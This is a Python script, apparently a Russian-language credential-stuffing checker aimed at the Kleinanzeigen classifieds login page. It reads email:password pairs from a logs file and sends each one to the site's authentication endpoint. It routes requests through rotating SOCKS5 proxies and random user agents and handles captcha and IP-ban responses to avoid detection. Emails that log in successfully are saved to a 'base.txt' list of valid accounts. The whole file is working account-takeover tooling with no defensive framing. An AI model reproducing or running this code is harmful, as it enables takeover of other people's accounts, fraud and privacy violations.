import os
import re
import threading
import time
import warnings
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from curl_cffi import requests
from fake_useragent import UserAgent

from config import PROXY_FILE_PATH, LOGS_FILE_PATH, PROFILE_URL
from main import output_lock

init(autoreset=True)
MAX_WORKERS = 1
LOGIN_URL = 'https://auth.kleinanzeigen.de/login/?client_id=ka-legacy-web&brand=kleinanzeigen&redirect_uri=https%3A%2F%2Fauth.kleinanzeigen.de%2Fapi%2Fauthorizer%2Fv2%2Fauthorize%3Fresponse_type%3Dcode%26redirect_uri=https%253A%252F%252Fwww.kleinanzeigen.de%253A443%252Fm-einloggen-callback.html%26state%3Dbaa9a9fb855441f88a1f1f34a7f865f0%26client_id%3Dka-legacy-web%26scope%3Doffline'
LOGIN_SUCCESS_INDICATOR = 'Willkommen bei Kleinanzeigen'

DEBUG_MODE = True  # Включение/выключение отладки

warnings.filterwarnings("ignore", message="`secure` changed to True for `__Secure-` prefixed cookies")

SOCKS5_REGEX = re.compile(r'^socks5://.+')


def debug_log(message, level="INFO"):
    if DEBUG_MODE:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")


def convert_proxies(file_path):
    debug_log(f"Начало конвертации прокси из файла: {file_path}")
    updated_proxies = []

    with open(file_path, 'r') as infile:
        for line in infile:
            line = line.strip()
            if not line:
                debug_log("Пропущена пустая строка.", "DEBUG")
                continue

            if SOCKS5_REGEX.match(line):
                updated_proxies.append(line)
                debug_log(f"Строка прокси SOCKS5: {line}", "DEBUG")
                continue

            parts = line.split(':')
            if len(parts) == 4:
                host = parts[0]
                port = parts[1]
                username = parts[2]
                password = parts[3]
                new_proxy_format = f"socks5://{username}:{password}@{host}:{port}"
                updated_proxies.append(new_proxy_format)
                debug_log(f"Конвертирована строка прокси: {line} в {new_proxy_format}", "DEBUG")
            else:
                print(f"Неверный формат строки: {line}")
                updated_proxies.append(line)
                debug_log(f"Неверный формат строки прокси: {line}", "WARNING")

    with open(file_path, 'w') as outfile:
        for proxy in updated_proxies:
            outfile.write(proxy + '\n')
            debug_log(f"Записана прокси строка: {proxy}", "DEBUG")

    debug_log(f"Конвертация прокси завершена. Обновлено {len(updated_proxies)} строк.")


def load_proxies(file_path):
    debug_log(f"Начало загрузки прокси из файла: {file_path}")
    proxies = []
    with open(file_path, 'r') as file:
        for line in file:
            proxies.append(line.strip())
            debug_log(f"Прокси загружен: {line.strip()}", "DEBUG")
    debug_log(f"Загрузка прокси завершена. Всего прокси: {len(proxies)}")
    return proxies


file_lock = threading.Lock()


def initialize_session():
    debug_log("Инициализация новой сессии.")


    user_agent = UserAgent().random

    while any(mobile in user_agent.lower() for mobile in ['iphone', 'mobile', 'android']):
        user_agent = UserAgent().random
        debug_log(f"Сгенерирован User-Agent (mobile): {user_agent}", "DEBUG")

    session = requests.Session()
    session.headers.update({
        'Accept': '*/*',
        'Accept-Language': 'en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'DNT': '1',
        'Referer': 'https://auth.kleinanzeigen.de/login/?client_id=ka-legacy-web&brand=kleinanzeigen&redirect_uri=https%3A%2F%2Fauth.kleinanzeigen.de%2Fapi%2Fauthorizer%2Fv2%2Fauthorize%3Fresponse_type%3Dcode%26redirect_uri=https%253A%252F%252Fwww.kleinanzeigen.de%253A443%252Fm-einloggen-callback.html%26state%3Dbaa9a9fb855441f88a1f1f34a7f865f0%26client_id%3Dka-legacy-web%26scope%3Doffline',
        'Sec-Fetch-Dest': 'script',
        'Sec-Fetch-Mode': 'no-cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Not=A?Brand";v="99", "Chromium";v="118"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    })
    debug_log(f"Сессия инициализирована с User-Agent: {user_agent}", "DEBUG")
    return session


def session_post_with_proxies(session, url, data, proxies, start_index, max_retries=3):
    proxy_index = random.randint(1, 20)
    error_500_count = 0
    error_403_count = 0
    debug_log(f"Начало POST-запроса к {url}, start_index: {start_index}", "DEBUG")

    while True:
        proxy = proxies[proxy_index % len(proxies)]
        debug_log(f"Выбран прокси: {proxy}, proxy_index: {proxy_index}", "DEBUG")
        retries = 0

        while retries < max_retries:
            try:
                debug_log(f"Попытка POST-запроса {retries + 1} с прокси: {proxy}", "DEBUG")
                response = session.post(url, data=data, proxies={"http": proxy, "https": proxy}, allow_redirects=True)

                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, "html.parser")
                    if soup.find("div", id="error") is None:
                        debug_log(f"Успешный POST-запрос: {response.status_code} c proxy: {proxy}", "DEBUG")
                        return response
                    else:
                        debug_log(f"Невалидный прокси (IP banned): {proxy}", "WARNING")
                    break
                elif response.status_code == 403:
                    soup = BeautifulSoup(response.text, "html.parser")
                    if soup.find("div", id="error") is None:
                        error_403_count += 1
                        if error_403_count >= 5:
                            debug_log(f"Ошибка 403 - капча, после {error_403_count} попыток.", "ERROR")
                            return "403 Error"
                        elif error_403_count % 2 == 0:
                            debug_log(f"Ошибка 403. Меняю прокси. Прокси: {proxy}", "DEBUG")
                            proxy_index = (proxy_index + MAX_WORKERS) % len(proxies)
                    else:
                        debug_log(f"Невалидный прокси (IP banned): {proxy}", "WARNING")
                        break
                elif response.status_code == 500:
                    soup = BeautifulSoup(response.text, "html.parser")
                    if soup.find("div", id="error") is None:
                        error_500_count += 1
                        if error_500_count >= 15:
                            debug_log("Ошибка 500 превышает лимит. Прерывание запроса.", "ERROR")
                            return "500 Error"
                        elif error_500_count % 2 == 0:
                            debug_log(f"Ошибка 500. Меняю прокси. Прокси: {proxy}", "DEBUG")
                            proxy_index = (proxy_index + MAX_WORKERS) % len(proxies)
                            retries += 1
                            time.sleep(1)
                        else:
                            debug_log(f"Невалидный прокси (IP banned): {proxy}", "WARNING")
                            break
                else:
                    debug_log(f"Неизвестная ошибка {response.status_code} с прокси {proxy}", "WARNING")
                    retries += 1
                    time.sleep(1)

            except Exception as e:
                debug_log(f"Исключение при запросе {retries + 1}: {e}", "ERROR")
                retries += 1
                time.sleep(1)

                proxy_index = (proxy_index + MAX_WORKERS) % len(proxies)
                debug_log("Завершение POST-запроса", "DEBUG")


output_lock = threading.Lock()

def get_profile_page(session, url, proxies, start_index, seen_emails, logpass, max_retries=1):
    debug_log(f"Начало проверки log:pass {logpass}", "DEBUG")
    email, password = logpass.split(':')

    while True:
        retries = 0
        while retries < max_retries:
            try:
                data = {
                    "email": email,
                    "password": password,
                }
                debug_log(f"Попытка входа с email: {email}, password: {password}", "DEBUG")
                response = session_post_with_proxies(session, LOGIN_URL, data, proxies, start_index, max_retries)

                if response == "500 Error":
                    with output_lock:
                        print(f"Ошибка 500: {logpass}")
                    debug_log(f"Ошибка 500 при входе с {logpass}", "ERROR")
                    return "500 Error"
                elif response == "403 Error":
                    with output_lock:
                        print(f"Ошибка 403: {logpass}")
                    debug_log(f"Ошибка 403 при входе с {logpass}", "ERROR")
                    return "403 Error"

                if response and response.status_code == 200:
                    soup = BeautifulSoup(response.text, "html.parser")
                    if soup.find("h2", string=LOGIN_SUCCESS_INDICATOR):
                        with output_lock:
                            print(f'{Fore.GREEN}Успешный вход{Style.RESET_ALL}: {logpass}')
                        debug_log(f"Успешный вход c логином: {email}", "INFO")
                        return email
                    else:
                        with output_lock:
                            print(f'Неверный {Fore.RED}логин или пароль{Style.RESET_ALL}: {logpass}')
                    debug_log(f"Неудачный вход с логином: {email}", "WARNING")
                    return "Invalid"
                else:
                    debug_log(f"Неизвестная ошибка при входе {response.status_code} с логином: {logpass}", "WARNING")
                    retries += 1
            except Exception as e:
                debug_log(f"Исключение при входе с логином {logpass}: {e}", "ERROR")
                retries += 1


def process_logpass(logpass, proxies, seen_emails, start_index, base_file_lock, base_file):
    debug_log(f"Начало обработки log:pass: {logpass}", "DEBUG")
    session = initialize_session()

    result = get_profile_page(session, PROFILE_URL, proxies, start_index, seen_emails, logpass)

    if isinstance(result, str) and result not in ["Invalid", "500 Error", "403 Error"]:
        with base_file_lock:
            if result not in seen_emails:
                base_file.write(result + '\n')
                base_file.flush()
                seen_emails.add(result)
                debug_log(f"Сохранен валидный email: {result}", "INFO")
    debug_log(f"Завершение обработки log:pass: {logpass}, результат: {result}", "DEBUG")
    return result


def main():
    convert_proxies(PROXY_FILE_PATH)

    proxies = load_proxies(PROXY_FILE_PATH)
    logpass_list = []
    seen_emails = set()
    valid_emails = []

    if os.path.exists("base.txt"):
        with open("base.txt", "r") as base_file:
            seen_emails.update(line.strip() for line in base_file)
        debug_log("Загружена предыдущая база email.")
    else:
        debug_log("Файл base.txt не найден, создан новый.")

    # Load log:pass from file
    try:
        with open(LOGS_FILE_PATH, "r") as file:
            logpass_list = [line.strip() for line in file if ":" in line]
            debug_log(f"Загружено {len(logpass_list)} логинов/паролей из файла: {LOGS_FILE_PATH}", "DEBUG")

    except FileNotFoundError:
        print(f"Ошибка: файл {LOGS_FILE_PATH} не найден.")
        debug_log(f"Файл {LOGS_FILE_PATH} не найден.", "ERROR")
        return

    with open("base.txt", "a") as base_file, ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        base_file_lock = threading.Lock()
        future_to_logpass = {
            executor.submit(process_logpass, logpass, proxies, seen_emails, i, base_file_lock,
                            base_file): logpass
            for i, logpass in enumerate(logpass_list)
        }

        for future in as_completed(future_to_logpass):
            result = future.result()
            if isinstance(result, str) and result not in ["Invalid", "500 Error", "403 Error"]:
                valid_emails.append(result)

    print("\nКоличество валида:", len(valid_emails))
    debug_log(f"Количество валидных email: {len(valid_emails)}", "INFO")
    input("Нажмите Enter, чтобы закрыть...")
    debug_log("Завершение работы скрипта.", "INFO")


if __name__ == "__main__":
    main()
